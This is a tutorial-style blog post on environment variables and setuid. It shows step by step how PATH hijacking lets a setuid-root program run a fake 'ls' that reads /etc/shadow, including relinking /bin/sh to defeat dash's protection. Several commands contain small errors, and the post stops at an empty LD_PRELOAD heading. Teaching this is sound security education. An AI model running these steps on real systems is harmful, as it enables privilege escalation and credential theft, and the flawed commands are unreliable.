---
layout: post
title: Environment Variables & SetUID
excerpt:
categories: [setuid, setgid]
---

### Environment Variables

Environment variables are variables that store information, such as configuration settings or system paths, which can be accessed by applications and scripts. Environment variables affect the behavior of programs and scripts that use them. Environment variables are usually stored in a key-value pair format, where the variable name represents the key and its corresponding value represents the data associated with that variable.

Environment variables can be set, modified, or removed by the user, by scripts, or by applications. To view the environmental variables that are already set, one can use `printenv` or `printenv [KEY]` i.e. `printenv SHELL`

To set an environment variable:

- `export KEY:"VALUE"`

To unset an environment variable:

- `unset KEY`

When a parent process creates a child process through `fork()`, the environment variables of the parent process is copied to the child process. This means that every child process will have by default the same environment variables that the parent posseses.

When `system()` is used to execute a command in a script or program, it doesn't directly execute the program, but rather calls `/bin/sh` to execute the command; however, when execve() is used to execute a command in a script or program, it directly executes a command. The implication of `system()` not directly executing the command is that any command provided cannot be effectively sanitized but gets sent through to `bin/sh` to execute.

<br>

### SetUID

Setuid, short for "set user ID upon execution," is a permission that allows a user to temporarily adopt the privileges of the owner of a file. This means thatwhen a setuid is enabled for an executable file, anyone who executes that file does so as though he/she is the file's owner.

Setuid if not implemented correctly can pose security risks. Malicious users can exploit such programs to execute arbitrary code with elevated privileges.

From the previous section, we got to know that some programs create new processes using `system()` and that these commands executed by `system()` are not executed directly, but through a call to `/bin/sh`. This means that when setuid programs invoke a new process by calling `system()`, bad things can happen.

When a relative path is given, the program searches through the "PATHS" provided in the environment variable. By modifying the "PATH" in the environment variable and appending the path where our malicious program is to the beginning og the PATH variable, we can trick the program ro run our malicious program with root permissions rather than the legitimate program.

<details>
  <Summary>
    Note:
  </Summary>
  <br>
   "/bin/sh" is a symbolic link pointing to "/bin/dash". Dash has a countermeasure that prevents itself from being executed in a Set-UID process. To see how our attack works without such a countermeasure, we will link "/bin/sh" to "/bin/sh" to "/bin/zsh" which does not have such countermeasure.
</details>


#### Create setuid program

1. The program that we would create and set the SetUID permission on is shown below:

   ```
    #include <stdlib.h>
    
    int main()
    {
      system("ls");
      return 0;
    }
    ```

2. Compile the program

   `gcc -o mysetuid mysetuid.c`

3. change the owner to root and set setuid permission

   - sudo chown root mysetuid

   -  sudo chmod 4755 mysetuid


#### Create malicious program

In order to take advantage of the vulnerability present in the setuid program, we will create a malicious program named ls and export the path of the malicious program to set the environment variable.

1. The malicious program that we would create is shown below:

   ```
    #include <stdlib.h>
    
    int main()
    {
      system("usr/bin/cat /etc/shadow");
      return 0;
    }
    ```

2. Compile the program

   `gcc -o malicious_app malicious_app`

3. backup the path, copy the malicious program to /tmp/bin/ and export the path

   - `printenv PATH > path_env.bk`
  
   - `mkdir /tmp/bin && cp ./malicious_app /tmp/bin/ls`
  
   - `export PATH=/tmp/bin:$PATH`


#### Run the setuid program

***PATH environment variable***

***`./mysetuid`***

<br>

### The LD PRELOAD Environment Variable


